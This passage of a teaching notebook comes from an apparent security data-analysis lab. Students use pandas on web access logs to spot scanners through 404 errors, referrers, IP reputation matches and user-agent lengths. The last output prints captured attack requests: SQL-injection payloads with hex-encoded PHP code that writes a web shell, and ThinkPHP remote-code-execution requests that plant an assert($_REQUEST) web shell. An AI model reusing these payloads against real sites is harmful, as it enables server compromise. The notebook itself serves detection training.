        "# Hint: using \".head(10)\" instead of \".head()\" will show 10 rows instead of 5\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "Y9lyLwgOfLqX",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "There seems to be a single IP causing many of the 404 errors.  Now filter the dataset to rows where the response code is 404 again, but this time display the frequency counts of the top IPs.  This will show us which IP addresses are causing repeated 404 errors."
      ]
    },
    {
      "metadata": {
        "id": "I2coxBngfKRo",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display frequency counts of IPs, after filtering the dataset to containly only rows where the response code is 404\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "SC9Q9-zegvLA",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Finally, let's take one of the most egregious IPs and look at all the activity it is responsible for.  Filter the dataset to include only rows from one of these IPs and display the first 10 rows."
      ]
    },
    {
      "metadata": {
        "id": "KzeSxXzIgYJL",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display the first 10 rows of activity caused by one of the IPs above that repeatedly causes 404 errors\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "fxOIVCOJibl3",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "You should see repeated POST requests for PHP files that do not exist.  This likely indicates someone running an automated tool that attempts to exploit known vulnerabilities in common web frameworks, such as WordPress.\n",
        "\n",
        "**Good job!  Using basic data manipulation and statistical guidance, you have detected malicious activity!**"
      ]
    },
    {
      "metadata": {
        "id": "axQTPJf8kVbd",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# HTTP Referrer (referrer)"
      ]
    },
    {
      "metadata": {
        "id": "OwQ2_W3FkY42",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Going back to the summary stats we generated at the beginning of this exercise, we noticed that more than half of the HTTP referrers were blank (i.e. set to \"-\").  Our previous exploration of number of bytes transferred and HTTP response codes lead us to believe that the majority of our dataset respresents benign activity.  Therefore, let's examine the less common case where the referrer is not blank to see if anything interesting is revealed."
      ]
    },
    {
      "metadata": {
        "id": "blYYYgy5l5Gl",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Start by filtering to display only rows where the \"referrer\" field is not equal to \"-\".  This can be written as **referrer != \"-\"**"
      ]
    },
    {
      "metadata": {
        "id": "nOO8UJGOhFHk",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display the first 10 rows where referrer != \"-\"\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "J9p6AFsunxYb",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "You may notice some of the initial activity looks like web scanning activity again (POST requests for files that don't exist).  Next, perform the same filter for rows where the referrer isn't blank, but this time list the most frequent IPs."
      ]
    },
    {
      "metadata": {
        "id": "MA53xWk_nwJN",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display the most frequent IPs creating requests where the referrer isn't blank\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "fLtI0ESmoYCq",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "You should notice significant overlap between this list, and the previous list of malicious IPs identified through our response code analysis.\n",
        "\n",
        "**Nice work!  By continuing the analysis, you discovered a second relationship in the data that could be used to detect or confirm malicious activity!**"
      ]
    },
    {
      "metadata": {
        "id": "qAS99IlGtBRZ",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Client IP Address (client_ip)"
      ]
    },
    {
      "metadata": {
        "id": "wqnVRDmrtIlD",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Our initial summary statistics did not reveal anything particularly interesting about this field.  With 1305 rows, there are 576 unique IPs, and the most frequent IP occurs only 23 times.\n",
        "\n",
        "One thing that might yield some insights is adding context by checking to see if any of the IPs appear in our list of threat indicators (stored in the \"intel_df\" DataFrame)."
      ]
    },
    {
      "metadata": {
        "id": "J81WLcc8uNFX",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Join our log dataset with our IP reputation data and display any matching items (refer to the Data Basics lab for an example)."
      ]
    },
    {
      "metadata": {
        "id": "4NJpNcgys_e8",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Join the log data with the ip reputation data and display matches\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "VGMqIkoKYBul",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "# Bonus Content"
      ]
    },
    {
      "metadata": {
        "id": "kVemp5gpYFgA",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "If you have made it this far and want to do some additional analysis, good on you!  Please enjoy these bonus challenges."
      ]
    },
    {
      "metadata": {
        "id": "QY0esFrlp39c",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## User Agent String (user_agent)"
      ]
    },
    {
      "metadata": {
        "id": "wIZC0zXdqJQr",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "The user agent string helps identify the browser version, allowing a web server to tailor its response accordingly.  If you don't know, they are relatively messy.  Our initial summary statistics didn't reveal anything unusual about this column.  In the interest of time, we will perform a quick analysis on the length of the strings, rather than sifting through the text itself."
      ]
    },
    {
      "metadata": {
        "id": "FnWqL-pIrKMw",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "The code snippet below generates a new dataframe that contains a single column.  The values in that column correspond to the length of each user agent string from the initial DataFrame."
      ]
    },
    {
      "metadata": {
        "id": "-3a_MMYbr3qM",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "ua_len_df = pd.DataFrame(access_logs_df['user_agent'].str.len())\n",
        "ua_len_df = ua_len_df.rename(columns={'user_agent':'length'})"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "CU-KY4gIr6ST",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Create a histogram from the \"ua_len_df\" DataFrame to get a feel for the distribution of the lengths."
      ]
    },
    {
      "metadata": {
        "id": "nBmX6aAar4gT",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Create a histogram of the ua_len_df DataFrame\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "LuXxiffCe6JD",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Based on the histogram, decide what a \"typical\" range is for the length of a user agent string.  Then examine values that fall outside that range.  Because of the way we generated the DataFrame of lengths, we can use it to index a subset of the original data.\n",
        "\n",
        "Below is an example of how to view especially long user agent strings.  Feel free to modify it based on the range you determined."
      ]
    },
    {
      "metadata": {
        "id": "Nlg0VoxGiKR0",
        "colab_type": "code",
        "outputId": "b41a62b7-e416-44a6-905e-28ceabeda740",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 224
        }
      },
      "cell_type": "code",
      "source": [
        "# Examine long user agent strings\n",
        "access_logs_df[ua_len_df['length'] > 150].user_agent.value_counts()"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10\"                                                                                      6\n",
              "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\"                                                5\n",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)\"                                                                                5\n",
              "Mozilla/5.0 (Linux; Android 5.1.1; vivo V3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/044408 Mobile Safari/537.36 V1_AND_SQ_4.6.1_9_YYB_D 3.7.1 QQ/5.3.1.704 NetType/4G 10000519\"    3\n",
              "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)\"                                                   2\n",
              "Mozilla/5.0 (Linux; U; Android 4.0.4; sk-sk; GT-S7562 Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/86.0.0.19.69;]\"                                                                          2\n",
              "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36\"                                                                                 1\n",
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 YaBrowser/18.1.1.841 Yowser/2.5 Safari/537.36\"                                                                                             1\n",
              "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en\"                                                                                           1\n",
              "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.2141.400 QQBrowser/9.5.10219.400\"                                                                                              1\n",
              "Name: user_agent, dtype: int64"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 19
        }
      ]
    },
    {
      "metadata": {
        "id": "UFa8v8hpieM_",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Examine short user agent strings\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "dXcLIKLliW_B",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "There doesn't seem to be anything unusual about the longer strings.  If your examination of the shorter strings reveals anything suspicious, display web activity associated with those user agent strings."
      ]
    },
    {
      "metadata": {
        "id": "lAQ62PlWjHne",
        "colab_type": "code",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Display access logs with suspicious user agent strings\n"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "id": "bfCxxesaYb6H",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Examining Parse Errors"
      ]
    },
    {
      "metadata": {
        "id": "qQodBD_1YyJw",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Examining errors that occur during parsing data is an important part of exploratory data analysis that we skipped in this lab for the sake of time.  It is important to resolve parsing issues and account for corrupt or missing data.\n",
        "\n",
        "One interesting aspect of this is that parse errors are often caused by irregularities in the data itself.  Web access logs that were not parsed correctly are stored in a list named \"access_logs_parsefail\".\n",
        "\n",
        "Examine these log lines using your web security expertise to see if they indicate unusual or malicious activity."
      ]
    },
    {
      "metadata": {
        "id": "Zr-PMeCMZslP",
        "colab_type": "code",
        "outputId": "5e15e089-45a0-4e7d-c0ee-0a30f440c580",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 241
        }
      },
      "cell_type": "code",
      "source": [
        "# Examine log lines that were now parsed correctly\n",
        "access_logs_parsefail"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['123.129.224.7 - - [22/Mar/2019:02:35:31 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:288:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '123.129.224.7 - - [22/Mar/2019:02:35:32 -0700] \"GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=xarhm.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=index/\\\\\\\\think\\\\\\\\template\\\\\\\\driver\\\\\\\\file/write&cacheFile=xarhm.php&content=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '123.129.224.7 - - [22/Mar/2019:02:35:33 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\\\\\"num\\\\\";s:297:\\\\\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:11:\\\\\"-1\\' UNION/*\\\\\";}45ea207d7a2b68c49582d2d22adf953a\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '123.129.224.7 - - [22/Mar/2019:02:35:34 -0700] \"GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=dflii.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=dflii.php&vars[1][]=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37$\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '134.159.86.163 - - [22/Mar/2019:02:44:00 -0700] \"GET //user.php?act=login HTTP/1.1\" 404 295 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:280:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324d75634768774a79776e50443977614841675a585a686243676b5831425055315262593130704f79412f506e6834654363702729293b2f2f7d787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"',\n",
              " '134.159.86.163 - - [22/Mar/2019:09:05:04 -0700] \"GET //user.php?act=login HTTP/1.1\" 404 295 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:280:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324d75634768774a79776e50443977614841675a585a686243676b5831425055315262593130704f79412f506e6834654363702729293b2f2f7d787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)\"',\n",
              " '171.11.205.240 - - [22/Mar/2019:22:34:19 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:288:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '171.11.205.240 - - [22/Mar/2019:22:34:20 -0700] \"GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=kdfai.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=index/\\\\\\\\think\\\\\\\\template\\\\\\\\driver\\\\\\\\file/write&cacheFile=kdfai.php&content=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '223.215.187.212 - - [23/Mar/2019:01:28:13 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\\\\\"num\\\\\";s:288:\\\\\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:3:\\\\\"\\'/*\\\\\";}\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '223.215.187.212 - - [23/Mar/2019:01:28:14 -0700] \"GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=tmdyx.php&content=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37 HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=index/\\\\\\\\think\\\\\\\\template\\\\\\\\driver\\\\\\\\file/write&cacheFile=tmdyx.php&content=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '223.215.187.212 - - [23/Mar/2019:01:28:28 -0700] \"GET /user.php?act=login HTTP/1.1\" 404 294 \"45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\\\\\"num\\\\\";s:297:\\\\\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10-- -\\\\\";s:2:\\\\\"id\\\\\";s:11:\\\\\"-1\\' UNION/*\\\\\";}45ea207d7a2b68c49582d2d22adf953a\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"',\n",
              " '223.215.187.212 - - [23/Mar/2019:01:28:29 -0700] \"GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=fgchz.php&vars%5B1%5D%5B%5D=%3C?php%20assert($_REQUEST%5B%22ysy%22%5D);?%3Eysydjsjxbei37$ HTTP/1.1\" 200 46423 \"http://www.secrepo.com/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=fgchz.php&vars[1][]=<?php assert($_REQUEST[\\\\\"ysy\\\\\"]);?>ysydjsjxbei37$\" \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\"']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 17
        }
      ]
    }
  ]
}